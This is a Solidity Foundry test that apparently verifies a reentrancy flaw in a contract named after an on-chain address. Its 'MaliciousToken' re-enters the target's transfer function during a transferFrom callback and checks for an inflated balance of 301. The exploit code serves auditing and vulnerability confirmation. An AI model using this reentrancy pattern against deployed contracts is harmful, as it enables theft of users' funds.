// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/0x2972d548497286d18e92b5fa1f8f9139e5653fd2.sol";

contract MaliciousToken {
    uint256 public callCount;
    demo public vulnerableContract;
    address public owner;

    constructor(address _vulnerable) {
        vulnerableContract = demo(_vulnerable);
        owner = msg.sender;
    }

    function transferFrom(address, address, uint256) external returns (bool) {
        callCount++;
        if (callCount == 1) {
            // Setup reentrant call parameters
            address[] memory reentrantTos = new address[](1);
            uint256[] memory reentrantAmounts = new uint256[](1);
            reentrantTos[0] = owner;
            reentrantAmounts[0] = 1;
            // Reenter vulnerable contract during execution
            vulnerableContract.transfer(owner, address(this), reentrantTos, reentrantAmounts);
        }
        return true;
    }
}

contract ReentrancyTest is Test {
    demo public vulnerable;
    MaliciousToken public maliciousToken;
    address public owner = makeAddr("owner");

    function setUp() public {
        // Deploy contracts
        vulnerable = new demo();
        maliciousToken = new MaliciousToken(address(vulnerable));
        
        // Approve malicious token in vulnerable contract
        vulnerable.approveToken(address(maliciousToken));
    }

    function testReentrantAttack() public {
        console.log("--- BEFORE-Trigger State ---");
        uint ownerBalanceBefore = vulnerable.userBalances(owner);
        uint totalTransfersBefore = vulnerable.totalTransfers();
        console.log("Owner balance before attack:", ownerBalanceBefore);
        console.log("Total transfers before attack:", totalTransfersBefore);

        console.log("--- Trigger Attack ---");
        // Prepare transfer parameters
        address[] memory tos = new address[](2);
        uint[] memory amounts = new uint[](2);
        (tos[0], tos[1]) = (owner, owner);
        (amounts[0], amounts[1]) = (100, 200);
        
        // Execute vulnerable transfer
        vulnerable.transfer(owner, address(maliciousToken), tos, amounts);
        
        console.log("--- AFTER-Trigger State ---");
        uint ownerBalanceAfter = vulnerable.userBalances(owner);
        uint totalTransfersAfter = vulnerable.totalTransfers();
        console.log("Owner balance after attack:", ownerBalanceAfter);
        console.log("Total transfers after attack:", totalTransfersAfter);

        // Calculate state changes
        uint balanceDiff = ownerBalanceAfter - ownerBalanceBefore;
        uint transferDiff = totalTransfersAfter - totalTransfersBefore;

        console.log(">>> Verification <<<");
        console.log("Owner balance increase (expected 301):", balanceDiff);
        console.log("Transfer count increase (expected 2):", transferDiff);

        // Evaluate vulnerability existence
        bool hasBalanceExploit = balanceDiff == 301;
        bool hasTransferExploit = transferDiff == 2;
        
        if (hasBalanceExploit && hasTransferExploit) {
            console.log("Vulnerability Exists: Reentrancy attack increased balance by 301 and transfer count by 2");
        } else {
            console.log("Vulnerability not Exist: State changes didn't match exploit pattern (balance +301/transfers +2)");
        }

        // Keep original assertion
        assertEq(maliciousToken.callCount(), 3, "Reentrancy not successful");
    }
}